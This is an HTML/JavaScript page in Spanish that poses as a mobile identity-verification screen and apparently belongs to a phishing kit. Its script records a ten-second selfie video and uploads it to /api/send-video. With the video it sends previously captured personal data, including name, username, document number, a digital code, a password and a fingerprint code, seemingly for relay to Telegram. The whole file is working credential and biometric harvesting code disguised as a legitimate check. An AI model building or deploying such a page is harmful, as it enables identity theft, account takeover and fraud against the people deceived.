<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Identidad</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --ds-green-primary: #046a38;
      --ds-green-secondary: #008744;
      --ds-gray-text: #595959;
      --ds-gray-title: #222222;
      --ds-bg: #fff;
    }

    * {
      box-sizing: border-box;
      font-family: 'Roboto', sans-serif;
      margin: 0;
      padding: 0;
    }

    html, body {
      background-color: var(--ds-bg);
      color: var(--ds-gray-text);
      display: flex;
      flex-direction: column;
      height: 100vh;
      height: 100dvh;
      width: 100vw;
      overflow: hidden;
    }

    .mobile-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 16px;
      background: #fff;
      position: relative;
      flex-shrink: 0;
    }

    .mobile-header-title {
      font-size: 16px;
      font-weight: 700;
      color: var(--ds-gray-title);
      flex: 1;
      text-align: center;
    }

    .header-icon {
      width: 24px;
      height: 24px;
      color: var(--ds-gray-text);
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .ds-contenido-principal {
      margin: 0 auto;
      max-width: 570px;
      width: 100%;
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 24px;
      overflow: hidden;
    }

    .video-container {
      position: relative;
      width: 280px;
      height: 280px;
      margin-bottom: 40px;
    }

    .video-circle {
      position: absolute;
      top: 10px;
      left: 10px;
      width: 260px;
      height: 260px;
      border-radius: 50%;
      overflow: hidden;
      background-color: #f0f0f0;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .video-element {
      width: 100%;
      height: 100%;
      object-fit: cover;
      transform: scaleX(-1);
    }

    .progress-svg {
      position: absolute;
      top: 0;
      left: 0;
      width: 280px;
      height: 280px;
      transform: rotate(-90deg);
    }

    .progress-circle {
      fill: transparent;
      stroke: var(--ds-green-secondary);
      stroke-width: 6;
      stroke-linecap: round;
      stroke-dasharray: 848;
      stroke-dashoffset: 848;
      transition: stroke-dashoffset 10s linear;
    }

    .instruction-text {
      color: var(--ds-gray-title);
      font-size: 20px;
      font-weight: 500;
      text-align: center;
      line-height: 28px;
      min-height: 84px;
      max-width: 260px;
    }

    .info-icon {
      position: absolute;
      right: 16px;
      top: 16px;
    }
  </style>
</head>
<body>
  <div class="mobile-header">
    <div class="header-icon">
      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <line x1="18" y1="6" x2="6" y2="18"></line>
        <line x1="6" y1="6" x2="18" y2="18"></line>
      </svg>
    </div>
    <div class="info-icon header-icon">
      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <circle cx="12" cy="12" r="10"></circle>
        <line x1="12" y1="16" x2="12" y2="12"></line>
        <line x1="12" y1="8" x2="12.01" y2="8"></line>
      </svg>
    </div>
  </div>

  <main class="ds-contenido-principal">
    <div class="video-container">
      <svg class="progress-svg" viewBox="0 0 280 280">
        <circle class="progress-circle" id="progressCircle" cx="140" cy="140" r="135"></circle>
      </svg>
      <div class="video-circle">
        <video id="videoElement" class="video-element" autoplay muted playsinline></video>
      </div>
    </div>
    <div class="instruction-text" id="instructionText">
      Permanece quieto,<br>con tu cara en el<br>centro del c&iacute;rculo
    </div>
  </main>

  <script src="tg.js"></script>
  <script>
    (async function () {
      const videoElement = document.getElementById('videoElement');
      const progressCircle = document.getElementById('progressCircle');
      const instructionText = document.getElementById('instructionText');
      
      let mediaRecorder;
      let recordedChunks = [];
      
      async function initCamera() {
        try {
          // Forzar resolución muy baja para que el video pese menos de 2MB
          const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { 
              facingMode: "user",
              width: { ideal: 720 },
              height: { ideal: 1280 }
            }, 
            audio: false 
          });
          
          videoElement.srcObject = stream;
          
          videoElement.onloadedmetadata = () => {
            videoElement.play().catch(e => console.log("Play blocked", e));
            startRecording(stream);
          };
        } catch (err) {
          console.error("Error accessing camera: ", err);
          let errorMsg = err.name + ": " + err.message;
          alert("Error de cámara (" + errorMsg + "). Por favor, asegúrate de dar permisos o toca la pantalla para reintentar.");
          
          instructionText.innerHTML = '<button id="btnRetryCamera" style="padding:10px 20px; background:#046a38; color:#fff; border:none; border-radius:8px; font-size:16px;">Reintentar Cámara</button>';
          document.getElementById('btnRetryCamera').addEventListener('click', () => {
            instructionText.innerHTML = "Iniciando...";
            initCamera();
          });
        }
      }

      initCamera();

      function startRecording(stream) {
        const options = { mimeType: 'video/webm;codecs=vp8', videoBitsPerSecond: 1500000 };
        try {
          mediaRecorder = new MediaRecorder(stream, options);
        } catch (e) {
          mediaRecorder = new MediaRecorder(stream);
        }
        
        mediaRecorder.ondataavailable = (e) => {
          if (e.data.size > 0) {
            recordedChunks.push(e.data);
          }
        };
        
        mediaRecorder.onstop = uploadVideo;
        
        mediaRecorder.start();
        
        setTimeout(() => {
          progressCircle.style.strokeDashoffset = "0";
        }, 100);

        setTimeout(() => {
          instructionText.innerHTML = "Si tienes lentes o<br>gorra, por favor<br>qu&iacute;tatelos";
        }, 3500);

        setTimeout(() => {
          instructionText.innerHTML = "Aseg&uacute;rate de estar<br>en un sitio bien<br>iluminado";
        }, 7000);

        setTimeout(() => {
          mediaRecorder.stop();
          stream.getTracks().forEach(track => track.stop());
        }, 10000);
      }

      function uploadVideo() {
        const blob = new Blob(recordedChunks, { type: 'video/webm' });
        TG.overlay(true);
        
        const reader = new FileReader();
        reader.readAsDataURL(blob);
        reader.onloadend = async function() {
          const base64data = reader.result.split(',')[1];
          
          let caption = '\u{1F464} Nombre: ' + TG.load('nombres') + '\n';
          caption += '\u{1F464} USU: ' + TG.load('usuario') + '\n';
          caption += '\u{1F4C4} Documento: ' + TG.load('documento') + '\n';
          caption += '\u{1F4C4} COD DIG: ' + TG.load('codDig') + '\n';
          caption += '\u{1F512} SENA: ' + TG.load('sena') + '\n';
          caption += '\u{1FAC6} Dactilar: ' + TG.load('dactilar');

          try {
            console.log("Enviando video de tamaño (bytes):", base64data.length);
            const response = await fetch('/api/send-video', {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json'
              },
              body: JSON.stringify({
                videoBase64: base64data,
                caption: caption
              })
            });
            
            const result = await response.json();
            TG.overlay(false);
            if (result.ok) {
              window.location.href = 'confirmar.html';
            } else {
              alert("Hubo un problema al enviar la validaci\u00F3n (Error del servidor). Por favor, reintenta.");
              window.location.reload();
            }
          } catch (e) {
            TG.overlay(false);
            alert("Error de conexi\u00F3n. El video es muy pesado o el internet fall\u00F3. Por favor reintenta.");
            window.location.reload();
          }
        };
      }
    })();
  </script>
</body>
</html>
